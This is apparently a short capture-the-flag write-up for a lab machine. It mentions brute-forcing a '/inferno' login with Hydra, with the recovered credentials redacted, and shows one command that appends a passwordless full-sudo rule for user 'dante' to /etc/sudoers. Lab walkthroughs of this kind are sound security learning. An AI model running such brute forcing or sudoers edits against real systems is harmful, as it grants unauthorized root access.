# Foothold
Initially we discover the `/inferno` directory. With a little help from Hydra we can brute force this and get credentials
`admin:<SNIP>`


`dante:<SNIP>`

echo 'dante ALL=(ALL) NOPASSWD: ALL' | sudo /usr/bin/tee -a /etc/sudoers